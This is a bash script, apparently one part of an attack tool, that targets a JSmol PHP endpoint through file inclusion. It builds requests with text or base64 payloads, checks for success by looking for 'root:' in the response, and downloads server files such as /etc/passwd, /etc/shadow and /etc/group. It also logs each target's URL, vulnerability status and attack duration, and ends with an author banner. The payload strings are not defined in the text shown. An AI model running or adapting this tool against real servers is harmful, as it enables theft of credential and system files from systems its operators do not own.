#!/bin/bash
function forgeRequest {
	this_filename="$1"
	this_payloadtype="$2" #txt, b64
	if [ $this_payloadtype = "b64" ] ||  [ $this_payloadtype = "B64" ];then
		this_forged_request="$jsmolphp_url?$payload_b64$this_filename" 
	else
		this_forged_request="$jsmolphp_url?$payload_txt$this_filename" 
	fi
	echo "$this_forged_request"
	}
function sendRequest {
	#curl -f : don't chow pages if reponse different from "200 OK"
	this_forged_request="$1"
	curl -ks -f --connect-timeout "$curl_ttl" --retry-max-time "$curl_ttl" --expect100-timeout "$curl_ttl" --happy-eyeballs-timeout-ms "$curl_ttl" --retry "$curl_retry" -o "$curl_output_filename" "$this_forged_request"
	}
function checkResult {
	this_check=$(cat "$curl_output_filename" 2>/dev/null | grep "root:")
	#this_check=$(cat "$curl_output_filename" 2>&1)
	if [ ${#this_check} -gt 0 ];then
		echo -e "OK"
	else
		echo -e "KO"
	fi
	}

function checkFileSize {
	this_filename="$1"
	this_filesize=$(cat $this_filename 2>/dev/null |wc -c)
	if [ $this_filesize -gt 2 ];then
		echo 'OK'
	else
		echo 'KO'
	fi

	}
function getFile {
	this_filename="$1"
	this_payloadtype="$2" #txt, b64
	this_dest_file="$3"
	this_forged_request=$(forgeRequest "$this_filename" "$this_payloadtype" )
	sendRequest "$this_forged_request" 
	#this_check_result=$(checkResult)
	#if [ $this_check_result = "OK" ];then
		cat "$curl_output_filename" > "$this_dest_file"
	#else
		#echo -e "    |_[!] ERROR: Can't get file $this_filename!" >&2
	#fi
	}
function checkFile {
	this_filename="$1"
	this_payloadtype="$2" #txt, b64
	this_forged_request=$(forgeRequest "$this_filename" "$this_payloadtype" )
	sendRequest "$this_forged_request" 
	this_check_result=$(checkResult)
	if [ $this_check_result = "OK" ];then
		continue_tests='FALSE'
		is_vuln='TRUE'
		functionnal_payload="$this_payloadtype"
	else
		continue_tests='TRUE'
		is_vuln='FALSE'
		functionnal_payload=''
	fi

	}
function downloadFiles {
	#convert target domaine to folder
	this_dl_sub_folder="$1"
	showTitle "Downloading files into" "$download_folder/$this_dl_sub_folder/" "1"
	total_files_downloaded=0
	total_files_being_dl=0
	for dl_file in ${download_files[*]};do
		total_files_being_dl=$(( $total_files_being_dl+1 ))
		dl_short_filename=$(echo "$dl_file"|rev|cut -d '/' -f 1|rev)
		dl_filename=$(echo "$dl_file"|sed 's/\//_/g'|sed 's/\.\./parent/g')
		dl_dest="$download_folder/$this_dl_sub_folder/$dl_filename"
		pct_dl=$(($total_files_being_dl*100/$total_files_to_dl))
		showTitle "[Progress:$c_submain$pct_dl$c_reset$c_main%][downloaded:$c_submain$total_files_downloaded/$total_files_to_dl$c_reset$c_main] $dl_file" "" "2" "noNL"
		getFile "$dl_file" "$functionnal_payload" "$dl_dest"
		check_size=$(checkFileSize "$dl_dest")
		
		if [ "$check_size" != "OK" ];then
			echo -e "$c_error$check_size$c_reset"
			rm -f "$dl_dest"
			if [ "$dl_file" = "/etc/passwd" ] || [ "$dl_file" = "/etc/passwd-" ];then
				got_passwd='TRUE'
			fi
			if [ "$dl_file" = "/etc/shadow" ] || [ "$dl_file" = "/etc/shadow-" ];then
				got_shadow='TRUE'
			fi
			if [ "$dl_file" = "/etc/group" ] || [ "$dl_file" = "/etc/group-" ];then
				got_group='TRUE'
			fi
		else
			total_files_downloaded=$(( $total_files_downloaded+1 ))
			echo -e "$c_text$check_size$c_reset"
		fi
	done
	}
function listDownloadedFiles {
	this_dl_sub_folder="$1"
	#listing downloaded files
	showTitle "Listing downloaded files" "" "1"
	#ls -Al "$download_folder/$this_dl_sub_folder/"|tail -n +2|egrep -v "^[[space]]*"|sed "s/^/    | /g"
	filelist=$(ls -A "$download_folder/$this_dl_sub_folder/")
	for fl in $(echo "$filelist");do
		showTitle "$fl" "" "2" ""
		showTitle "Filesize" "$filesize" "3" "NoNL"
		echo ""$(stat -c%s "$download_folder/$this_dl_sub_folder/$fl")" octets"
		showTitle "Tag search" "" "3" ""
		for tg in ${tags_checklist[*]};do
			check_tag=$(cat "$download_folder/$this_dl_sub_folder/$fl" | grep -n "$tg")
			if [ ${#check_tag} -gt 0 ];then 
				showTitle "$tg tag" "$c_main" "4" "noNL"
				#echo -e ""$(echo -e "$check_tag$c_text"|sed "s/^/\\\n${arbo[5]}${chips[5]}\\$c_text/g"|sed "s/  /#@ยง/g")|sed "s/#@ยง/  /g"
				echo -e ""$(echo -e "$check_tag$c_text"|sed "s/^/\\\n${arbo[5]}${chips[5]}line \\$c_text/g"|sed "s/  /#@ยง/g")|sed "s/#@ยง/  /g"
			fi
		done
	done
	}
function checkFolders {
	this_folder="$download_folder"
	this_subfolder="$1"
	if [ ! -d "$download_folder" ];then 
		showTitle "Creating" "$download_folder" "2" "NoNL"
		mkdir "$download_folder" 
		echo -e "Done"$c_reset
	else
		showTitle "Folder $download_folder" "Already exists" "2"
	fi
	if [ ! -d "$download_folder/$dl_sub_folder" ];then 
		showTitle "Creating" "$download_folder/$dl_sub_folder" "2" "NoNL"
		mkdir "$download_folder/$dl_sub_folder" 
		echo -e "Done"$c_reset
	else
		showTitle "Folder $download_folder/$dl_sub_folder" "Already exists" "2"
	fi
	}
function saveToHistory {
	#URL;VULNERABLE;PASSWD;SHADOW;GROUP;DATE;DURATION
	history_line="$jsmolphp_url;$is_vuln;$got_passwd;$got_shadow;$got_group;$attack_date_start;$attack_duration"
	echo -e "$history_line" >> "$history_file" 
	}
function showTitle {
	this_label="$1"
	this_msg="$2"
	this_lvl="$3"
	this_nl="$4"
	this_chip=${chips[$this_lvl]}
	this_arbo=${arbo[$this_lvl]}

	if [ ${#this_nl} -gt 0 ];then
		echo -en "$c_main$this_arbo$this_chip $this_label:$c_text $this_msg"
	else
		echo -e  "$c_main$this_arbo$this_chip $this_label:$c_text $this_msg"
	fi
	}
function showBanner {
	echo -e "$c_main"
	banner=$(echo "$banner"|base64 -d)
	l1=$(echo "$banner"|head -n 1 |tail -n 2)
	l2=$(echo "$banner"|head -n 3 |tail -n 1)
	l3=$(echo "$banner"|head -n 4 |tail -n 1)
	l4=$(echo "$banner"|head -n 5 |tail -n 1)
	lasts=$(echo "$banner"|tail -n +6 )
	echo -e "\033[0;31m$l1"
	echo -e "\033[1;31m$l2"
	echo -e "\033[0;33m$l3"
	echo -e "\033[1;33m$l4"
	echo -e "$c_main$lasts"
	echo -e "$c_text         By CHORFA Alla-eddine -  h4ckr213dz@gmail.com$c_reset\n"
	}

